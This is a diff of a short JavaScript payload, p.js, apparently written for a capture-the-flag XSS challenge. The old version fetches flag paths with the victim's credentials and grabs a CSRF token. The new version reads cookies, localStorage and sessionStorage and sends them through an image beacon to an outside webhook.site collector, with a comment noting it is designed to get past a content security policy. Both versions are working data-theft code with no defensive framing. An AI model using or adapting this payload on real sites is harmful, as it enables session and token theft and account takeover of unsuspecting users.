@@ -1,37 +1,45 @@
-// p.js  — self-exec, CSP-safe
+// p.js — cookie/localStorage/sessionStorage exfil via image beacon (CSP-safe)
 (function () {
-  var paths = ["/flag", "/flag.txt", "/admin/flag", "/api/flag"];
-
-  // Optional: try to grab a CSRF token from DOM if present
-  var token = "";
-  try {
-    var s = document.querySelector('input[name=csrf_token],input[name=csrf-token]');
-    if (s && s.value) token = s.value;
-    var m = document.querySelector('meta[name=csrf-token]');
-    if (!token && m && m.content) token = m.content;
-  } catch (e) {}
-
-  function exfil(text) {
+  function send(qkey, qval) {
     try {
-      var i = new Image();
-      i.referrerPolicy = "no-referrer";
-      // ONLY image beacon to your collector (allowed by img-src https:)
-      i.src = "https://webhook.site/abc5b1d6-8272-4188-873e-5b98c81ed700"
-            + "?d=" + encodeURIComponent((text || "").slice(0, 6000))
-            + "&t=" + encodeURIComponent(token)
-            + "&u=" + encodeURIComponent(location.href);
+      var img = new Image();
+      img.referrerPolicy = "no-referrer";
+      img.src =
+        "https://webhook.site/abc5b1d6-8272-4188-873e-5b98c81ed700" +
+        "?u=" + encodeURIComponent(location.href) +
+        "&" + encodeURIComponent(qkey) + "=" + encodeURIComponent(String(qval).slice(0,6000));
     } catch (e) {}
   }
 
-  (function next(k) {
-    if (k >= paths.length) { exfil("[no-flag]"); return; }
-    fetch(paths[k], { credentials: "include" })
-      .then(function (r) {
-        if (!r.ok) { next(k + 1); return; }
-        return r.text().then(function (t) {
-          if (t) exfil(t); else next(k + 1);
-        });
-      })
-      .catch(function () { next(k + 1); });
-  })(0);
+  // 1) Cookies (works if NOT HttpOnly)
+  try {
+    var ck = document.cookie || "";
+    if (ck) send("c", ck);
+  } catch (e) {}
+
+  // 2) localStorage (sometimes apps stash tokens here)
+  try {
+    if (window.localStorage && localStorage.length) {
+      var ls = [];
+      for (var i = 0; i < localStorage.length; i++) {
+        var k = localStorage.key(i);
+        var v = localStorage.getItem(k);
+        ls.push(k + "=" + v);
+      }
+      if (ls.length) send("ls", ls.join("&"));
+    }
+  } catch (e) {}
+
+  // 3) sessionStorage (optional)
+  try {
+    if (window.sessionStorage && sessionStorage.length) {
+      var ss = [];
+      for (var j = 0; j < sessionStorage.length; j++) {
+        var k2 = sessionStorage.key(j);
+        var v2 = sessionStorage.getItem(k2);
+        ss.push(k2 + "=" + v2);
+      }
+      if (ss.length) send("ss", ss.join("&"));
+    }
+  } catch (e) {}
 })();
